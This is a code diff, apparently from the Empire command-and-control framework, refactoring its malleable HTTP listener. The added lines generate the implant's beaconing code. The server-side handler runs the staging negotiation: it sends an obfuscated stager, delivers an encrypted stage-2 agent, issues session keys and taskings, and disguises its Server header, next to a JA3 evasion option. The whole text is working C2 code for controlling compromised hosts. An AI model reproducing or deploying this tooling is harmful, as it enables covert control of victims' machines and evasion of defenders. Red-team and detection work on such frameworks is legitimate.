+            ):
+                sendMessage += (
+                    "            req.add_header('"
+                    + profile.post.client.output.terminator.arg
+                    + "', routingPacket)\n"
+                )
+
+            # ==== BUILD GET ====
+            sendMessage += "        else:\n"
+
+            # ==== BUILD ROUTING PACKET
+            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
+            sendMessage += (
+                "\n".join(
+                    [
+                        "            " + _
+                        for _ in profile.get.client.metadata.generate_python(
+                            "routingPacket"
+                        ).split("\n")
+                    ]
+                )
+                + "\n"
+            )
+
+            # ==== CHOOSE URI ====
+            sendMessage += (
+                "            taskUri = random.sample("
+                + str(profile.get.client.uris)
+                + ", 1)[0]\n"
+            )
+            sendMessage += "            requestUri = self.server + taskUri;\n"
+
+            # ==== ADD PARAMETERS ====
+            sendMessage += "            parameters = {}\n"
+            for parameter, value in profile.get.client.parameters.items():
+                sendMessage += (
+                    "             parameters['" + parameter + "'] = '" + value + "'\n"
+                )
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.PARAMETER
+            ):
+                sendMessage += (
+                    "             parameters['"
+                    + profile.get.client.metadata.terminator.arg
+                    + "'] = routingPacket\n"
+                )
+            sendMessage += "            if parameters:\n"
+            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"
+
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.URIAPPEND
+            ):
+                sendMessage += "                requestUri += routingPacket;\n"
+
+            # ==== ADD BODY ====
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.PRINT
+            ):
+                sendMessage += "                body = routingPacket\n"
+            else:
+                sendMessage += "            body = '" + profile.get.client.body + "'\n"
+            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"
+
+            # ==== BUILD REQUEST ====
+            sendMessage += "            req = vreq(requestUri, body)\n"
+            sendMessage += "            req.verb = '" + profile.get.client.verb + "'\n"
+
+            # ==== ADD HEADERS ====
+            for header, value in profile.get.client.headers.items():
+                sendMessage += (
+                    "            req.add_header('" + header + "', '" + value + "')\n"
+                )
+            if (
+                profile.get.client.metadata.terminator.type
+                == malleable.Terminator.HEADER
+            ):
+                sendMessage += (
+                    "            req.add_header('"
+                    + profile.get.client.metadata.terminator.arg
+                    + "', routingPacket)\n"
+                )
+
+            # ==== SEND REQUEST ====
+            sendMessage += "        try:\n"
+            sendMessage += "            res = urllib.request.urlopen(req);\n"
+
+            # ==== EXTRACT RESPONSE ====
+            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
+                header = profile.get.server.output.terminator.arg
+                sendMessage += (
+                    "            data = res.info().dict['"
+                    + header
+                    + "'] if '"
+                    + header
+                    + "' in res.info().dict else ''\n"
+                )
+                sendMessage += "            data = urllib.parse.unquote(data)\n"
+            elif (
+                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
+            ):
+                sendMessage += "            data = res.read()\n"
+
+            # ==== DECODE RESPONSE ====
+            sendMessage += (
+                "\n".join(
+                    [
+                        "        " + _
+                        for _ in profile.get.server.output.generate_python_r(
+                            "data"
+                        ).split("\n")
+                    ]
+                )
+                + "\n"
+            )
+            # before return we encode to bytes, since in some transformations "join" produces str
+            sendMessage += (
+                "            if isinstance(data,str): data = data.encode('latin-1');\n"
+            )
+            sendMessage += "            return ('200', data)\n"
+
+            # ==== HANDLE ERROR ====
+            sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
+            sendMessage += "            self.missedCheckins += 1\n"
+            sendMessage += "            if HTTPError.code == 401:\n"
+            sendMessage += "                sys.exit(0)\n"
+            sendMessage += "            return (HTTPError.code, '')\n"
+            sendMessage += "        except urllib.request.URLError as URLError:\n"
+            sendMessage += "            self.missedCheckins += 1\n"
+            sendMessage += "            return (URLError.reason, '')\n"
+
+            sendMessage += "        return ('', '')\n"
+
+            return sendMessage
+
+        log.error(
+            "listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def start_server(self, listenerOptions):
         """
@@ -1444,298 +1379,276 @@ class ExtendedPacketHandler(PacketHandler):
                         if implementation:
                             break
 
-                # attempt to extract information from the request
-                if implementation:
-                    agentInfo = None
-                    if implementation is profile.stager and request.method == "POST":
-                        # stage 1 negotiation comms are hard coded, so we can't use malleable
-                        agentInfo = malleableRequest.body
-                    elif implementation is profile.post:
-                        # the post implementation has two spots for data, requires two-part extraction
-                        agentInfo, output = implementation.extract_client(
-                            malleableRequest
-                        )
-                        agentInfo = (agentInfo if agentInfo else b"") + (
-                            output if output else b""
-                        )
-                    else:
-                        agentInfo = implementation.extract_client(malleableRequest)
-                    if agentInfo:
-                        dataResults = self.mainMenu.agents.handle_agent_data(
-                            stagingKey, agentInfo, listenerOptions, clientIP
-                        )
-                        if dataResults and len(dataResults) > 0:
-                            for language, results in dataResults:
-                                if results:
-                                    if isinstance(results, str):
-                                        results = results.encode("latin-1")
-                                    if results == b"STAGE0":
-                                        # step 2 of negotiation -> server returns stager (stage 1)
-
-                                        # log event
-                                        message = f"{listenerName} Sending {language} stager (stage 1) to {clientIP}"
-                                        self.instance_log.info(message)
-                                        log.info(message)
-
-                                        # build stager (stage 1)
-                                        with SessionLocal() as db:
-                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
-                                                db, language
-                                            )
-                                            stager = self.generate_stager(
-                                                language=language,
-                                                listenerOptions=listenerOptions,
-                                                obfuscate=(
-                                                    False
-                                                    if not obf_config
-                                                    else obf_config.enabled
-                                                ),
-                                                obfuscation_command=(
-                                                    ""
-                                                    if not obf_config
-                                                    else obf_config.command
-                                                ),
-                                            )
-
-                                        # build malleable response with stager (stage 1)
-                                        malleableResponse = (
-                                            implementation.construct_server(stager)
-                                        )
-
-                                        if "Server" in malleableResponse.headers:
-                                            WSGIRequestHandler.server_version = (
-                                                malleableResponse.headers["Server"]
-                                            )
-                                            WSGIRequestHandler.sys_version = ""
-
-                                        return Response(
-                                            malleableResponse.body,
-                                            malleableResponse.code,
-                                            malleableResponse.headers,
-                                        )
-
-                                    elif results.startswith(b"STAGE2"):
-                                        # step 6 of negotiation -> server sends patched agent (stage 2)
-
-                                        if ":" in clientIP:
-                                            clientIP = "[" + clientIP + "]"
-                                        sessionID = (
-                                            results.split(b" ")[1]
-                                            .strip()
-                                            .decode("UTF-8")
-                                        )
-                                        sessionKey = self.mainMenu.agents.agents[
-                                            sessionID
-                                        ]["sessionKey"]
-
-                                        # log event
-                                        message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
-                                        self.instance_log.info(message)
-                                        log.info(message)
-
-                                        # TODO: handle this with malleable??
-                                        tempListenerOptions = None
-                                        if "Hop-Name" in request.headers:
-                                            hopListenerName = request.headers.get(
-                                                "Hop-Name"
-                                            )
-                                            if hopListenerName:
-                                                try:
-                                                    hopListener = (
-                                                        data_util.get_listener_options(
-                                                            hopListenerName
-                                                        )
-                                                    )
-                                                    tempListenerOptions = copy.deepcopy(
-                                                        listenerOptions
-                                                    )
-                                                    tempListenerOptions["Host"][
-                                                        "Value"
-                                                    ] = hopListener["Host"]["Value"]
-                                                except TypeError:
-                                                    tempListenerOptions = (
-                                                        listenerOptions
-                                                    )
-
-                                        session_info = (
-                                            SessionLocal()
-                                            .query(models.Agent)
-                                            .filter(
-                                                models.Agent.session_id == sessionID
-                                            )
-                                            .first()
-                                        )
-                                        if session_info.language == "ironpython":
-                                            version = "ironpython"
-                                        else:
-                                            version = ""
-
-                                        # generate agent
-                                        with SessionLocal() as db:
-                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
-                                                db, language
-                                            )
-                                            agentCode = self.generate_agent(
-                                                language=language,
-                                                listenerOptions=(
-                                                    tempListenerOptions
-                                                    if tempListenerOptions
-                                                    else listenerOptions
-                                                ),
-                                                obfuscate=(
-                                                    False
-                                                    if not obf_config
-                                                    else obf_config.enabled
-                                                ),
-                                                obfuscation_command=(
-                                                    ""
-                                                    if not obf_config
-                                                    else obf_config.command
-                                                ),
-                                                version=version,
-                                            )
-
-                                        if language.lower() in ["python", "ironpython"]:
-                                            sessionKey = bytes.fromhex(sessionKey)
-
-                                        encryptedAgent = (
-                                            encryption.aes_encrypt_then_hmac(
-                                                sessionKey, agentCode
-                                            )
-                                        )
-
-                                        # build malleable response with agent
-                                        # note: stage1 comms are hard coded, can't use malleable here.
-                                        return Response(
-                                            encryptedAgent,
-                                            200,
-                                            implementation.server.headers,
-                                        )
-
-                                    elif results[:10].lower().startswith(
-                                        b"error"
-                                    ) or results[:10].lower().startswith(b"exception"):
-                                        # agent returned an error
-                                        message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
-                                        self.instance_log.error(message)
-                                        log.error(message)
-
-                                        return Response(self.default_response(), 404)
-
-                                    elif results.startswith(b"ERROR:"):
-                                        # error parsing agent data
-                                        message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
-                                        self.instance_log.error(message)
-                                        log.error(message)
-
-                                        if b"not in cache" in results:
-                                            # signal the client to restage
-                                            log.info(
-                                                f"{listenerName} Orphaned agent from {clientIP}, signaling restaging"
-                                            )
-                                            return make_response("", 401)
-
-                                        return Response(self.default_response(), 404)
-
-                                    elif results == b"VALID":
-                                        # agent posted results
-                                        message = f"{listenerName} Valid results returned by {clientIP}"
-                                        self.instance_log.info(message)
-
-                                        malleableResponse = (
-                                            implementation.construct_server("")
-                                        )
-
-                                        if "Server" in malleableResponse.headers:
-                                            WSGIRequestHandler.server_version = (
-                                                malleableResponse.headers["Server"]
-                                            )
-                                            WSGIRequestHandler.sys_version = ""
-
-                                        return Response(
-                                            malleableResponse.body,
-                                            malleableResponse.code,
-                                            malleableResponse.headers,
-                                        )
-
-                                    else:
-                                        if request.method == b"POST":
-                                            # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-
-                                            message = f"{listenerName}: Sending session key to {clientIP}"
-                                            self.instance_log.info(message)
-                                            log.info(message)
-
-                                            # note: stage 1 negotiation comms are hard coded, so we can't use malleable
-                                            return Response(
-                                                results,
-                                                200,
-                                                implementation.server.headers,
-                                            )
-
-                                        else:
-                                            # agent requested taskings
-                                            message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
-                                            self.instance_log.info(message)
-
-                                            # build malleable response with results
-                                            malleableResponse = (
-                                                implementation.construct_server(results)
-                                            )
-                                            if isinstance(malleableResponse.body, str):
-                                                malleableResponse.body = (
-                                                    malleableResponse.body.encode(
-                                                        "latin-1"
-                                                    )
-                                                )
-
-                                            if "Server" in malleableResponse.headers:
-                                                WSGIRequestHandler.server_version = (
-                                                    malleableResponse.headers["Server"]
-                                                )
-                                                WSGIRequestHandler.sys_version = ""
-
-                                            return Response(
-                                                malleableResponse.body,
-                                                malleableResponse.code,
-                                                malleableResponse.headers,
-                                            )
-
-                                else:
-                                    # no tasking for agent
-                                    message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
-                                    self.instance_log.info(message)
-
-                                    # build malleable response with no results
-                                    malleableResponse = implementation.construct_server(
-                                        results
-                                    )
-
-                                    if "Server" in malleableResponse.headers:
-                                        WSGIRequestHandler.server_version = (
-                                            malleableResponse.headers["Server"]
-                                        )
-                                        WSGIRequestHandler.sys_version = ""
-
-                                    return Response(
-                                        malleableResponse.body,
-                                        malleableResponse.code,
-                                        malleableResponse.headers,
-                                    )
-                        else:
-                            # log error parsing routing packet
-                            message = f"{listenerName} Error parsing routing packet from {clientIP}: {agentInfo!s}."
-                            self.instance_log.error(message)
-                            log.error(message)
-
-                    # log invalid request
-                    message = f"/{request_uri} requested by {clientIP} with no routing packet."
-                    self.instance_log.error(message)
-
-                else:
+                if not implementation:
                     # log invalid uri
                     message = f"{listenerName}: unknown uri /{request_uri} requested by {clientIP}."
                     self.instance_log.warning(message)
+
+                # attempt to extract information from the request
+                agentInfo = None
+                if implementation is profile.stager and request.method == "POST":
+                    # stage 1 negotiation comms are hard coded, so we can't use malleable
+                    agentInfo = malleableRequest.body
+                elif implementation is profile.post:
+                    # the post implementation has two spots for data, requires two-part extraction
+                    agentInfo, output = implementation.extract_client(malleableRequest)
+                    agentInfo = (agentInfo if agentInfo else b"") + (
+                        output if output else b""
+                    )
+                else:
+                    agentInfo = implementation.extract_client(malleableRequest)
+                if agentInfo:
+                    dataResults = self.mainMenu.agents.handle_agent_data(
+                        stagingKey, agentInfo, listenerOptions, clientIP
+                    )
+                    if not dataResults or len(dataResults) <= 0:
+                        # log error parsing routing packet
+                        message = f"{listenerName} Error parsing routing packet from {clientIP}: {agentInfo!s}."
+                        self.instance_log.error(message)
+                        log.error(message)
+
+                    for language, results in dataResults:
+                        if results:
+                            if isinstance(results, str):
+                                results = results.encode("latin-1")
+                            if results == b"STAGE0":
+                                # step 2 of negotiation -> server returns stager (stage 1)
+
+                                # log event
+                                message = f"{listenerName} Sending {language} stager (stage 1) to {clientIP}"
+                                self.instance_log.info(message)
+                                log.info(message)
+
+                                # build stager (stage 1)
+                                with SessionLocal() as db:
+                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
+                                    )
+                                    stager = self.generate_stager(
+                                        language=language,
+                                        listenerOptions=listenerOptions,
+                                        obfuscate=(
+                                            False
+                                            if not obf_config
+                                            else obf_config.enabled
+                                        ),
+                                        obfuscation_command=(
+                                            "" if not obf_config else obf_config.command
+                                        ),
+                                    )
+
+                                # build malleable response with stager (stage 1)
+                                malleableResponse = implementation.construct_server(
+                                    stager
+                                )
+
+                                if "Server" in malleableResponse.headers:
+                                    WSGIRequestHandler.server_version = (
+                                        malleableResponse.headers["Server"]
+                                    )
+                                    WSGIRequestHandler.sys_version = ""
+
+                                return Response(
+                                    malleableResponse.body,
+                                    malleableResponse.code,
+                                    malleableResponse.headers,
+                                )
+
+                            if results.startswith(b"STAGE2"):
+                                # step 6 of negotiation -> server sends patched agent (stage 2)
+
+                                if ":" in clientIP:
+                                    clientIP = "[" + clientIP + "]"
+                                sessionID = (
+                                    results.split(b" ")[1].strip().decode("UTF-8")
+                                )
+                                sessionKey = self.mainMenu.agents.agents[sessionID][
+                                    "sessionKey"
+                                ]
+
+                                # log event
+                                message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
+                                self.instance_log.info(message)
+                                log.info(message)
+
+                                # TODO: handle this with malleable??
+                                tempListenerOptions = None
+                                if "Hop-Name" in request.headers:
+                                    hopListenerName = request.headers.get("Hop-Name")
+                                    if hopListenerName:
+                                        try:
+                                            hopListener = (
+                                                data_util.get_listener_options(
+                                                    hopListenerName
+                                                )
+                                            )
+                                            tempListenerOptions = copy.deepcopy(
+                                                listenerOptions
+                                            )
+                                            tempListenerOptions["Host"]["Value"] = (
+                                                hopListener["Host"]["Value"]
+                                            )
+                                        except TypeError:
+                                            tempListenerOptions = listenerOptions
+
+                                session_info = (
+                                    SessionLocal()
+                                    .query(models.Agent)
+                                    .filter(models.Agent.session_id == sessionID)
+                                    .first()
+                                )
+                                if session_info.language == "ironpython":
+                                    version = "ironpython"
+                                else:
+                                    version = ""
+
+                                # generate agent
+                                with SessionLocal() as db:
+                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                        db, language
+                                    )
+                                    agentCode = self.generate_agent(
+                                        language=language,
+                                        listenerOptions=(
+                                            tempListenerOptions
+                                            if tempListenerOptions
+                                            else listenerOptions
+                                        ),
+                                        obfuscate=(
+                                            False
+                                            if not obf_config
+                                            else obf_config.enabled
+                                        ),
+                                        obfuscation_command=(
+                                            "" if not obf_config else obf_config.command
+                                        ),
+                                        version=version,
+                                    )
+
+                                if language.lower() in ["python", "ironpython"]:
+                                    sessionKey = bytes.fromhex(sessionKey)
+
+                                encryptedAgent = encryption.aes_encrypt_then_hmac(
+                                    sessionKey, agentCode
+                                )
+
+                                # build malleable response with agent
+                                # note: stage1 comms are hard coded, can't use malleable here.
+                                return Response(
+                                    encryptedAgent,
+                                    200,
+                                    implementation.server.headers,
+                                )
+
+                            if results[:10].lower().startswith(b"error") or results[
+                                :10
+                            ].lower().startswith(b"exception"):
+                                # agent returned an error
+                                message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
+                                self.instance_log.error(message)
+                                log.error(message)
+
+                                return Response(self.default_response(), 404)
+
+                            if results.startswith(b"ERROR:"):
+                                # error parsing agent data
+                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
+                                self.instance_log.error(message)
+                                log.error(message)
+
+                                if b"not in cache" in results:
+                                    # signal the client to restage
+                                    log.info(
+                                        f"{listenerName} Orphaned agent from {clientIP}, signaling restaging"
+                                    )
+                                    return make_response("", 401)
+
+                                return Response(self.default_response(), 404)
+
+                            if results == b"VALID":
+                                # agent posted results
+                                message = f"{listenerName} Valid results returned by {clientIP}"
+                                self.instance_log.info(message)
+
+                                malleableResponse = implementation.construct_server("")
+
+                                if "Server" in malleableResponse.headers:
+                                    WSGIRequestHandler.server_version = (
+                                        malleableResponse.headers["Server"]
+                                    )
+                                    WSGIRequestHandler.sys_version = ""
+
+                                return Response(
+                                    malleableResponse.body,
+                                    malleableResponse.code,
+                                    malleableResponse.headers,
+                                )
+
+                            if request.method == b"POST":
+                                # step 4 of negotiation -> server returns RSA(nonce+AESsession))
+
+                                message = (
+                                    f"{listenerName}: Sending session key to {clientIP}"
+                                )
+                                self.instance_log.info(message)
+                                log.info(message)
+
+                                # note: stage 1 negotiation comms are hard coded, so we can't use malleable
+                                return Response(
+                                    results,
+                                    200,
+                                    implementation.server.headers,
+                                )
+
+                            # agent requested taskings
+                            message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                            self.instance_log.info(message)
+
+                            # build malleable response with results
+                            malleableResponse = implementation.construct_server(results)
+                            if isinstance(malleableResponse.body, str):
+                                malleableResponse.body = malleableResponse.body.encode(
+                                    "latin-1"
+                                )
+
+                            if "Server" in malleableResponse.headers:
+                                WSGIRequestHandler.server_version = (
+                                    malleableResponse.headers["Server"]
+                                )
+                                WSGIRequestHandler.sys_version = ""
+
+                            return Response(
+                                malleableResponse.body,
+                                malleableResponse.code,
+                                malleableResponse.headers,
+                            )
+
+                        # no tasking for agent
+                        message = (
+                            f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                        )
+                        self.instance_log.info(message)
+
+                        # build malleable response with no results
+                        malleableResponse = implementation.construct_server(results)
+
+                        if "Server" in malleableResponse.headers:
+                            WSGIRequestHandler.server_version = (
+                                malleableResponse.headers["Server"]
+                            )
+                            WSGIRequestHandler.sys_version = ""
+
+                        return Response(
+                            malleableResponse.body,
+                            malleableResponse.code,
+                            malleableResponse.headers,
+                        )
+
+                # log invalid request
+                message = (
+                    f"/{request_uri} requested by {clientIP} with no routing packet."
+                )
+                self.instance_log.error(message)
 
             except malleable.MalleableError as e:
                 # probably an issue with the malleable library, please report it :)
@@ -1765,8 +1678,8 @@ class ExtendedPacketHandler(PacketHandler):
 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain(
-                    "%s/empire-chain.pem" % (certPath),
-                    "%s/empire-priv.key" % (certPath),
+                    f"{certPath}/empire-chain.pem",
+                    f"{certPath}/empire-priv.key",
                 )
 
                 if ja3_evasion:
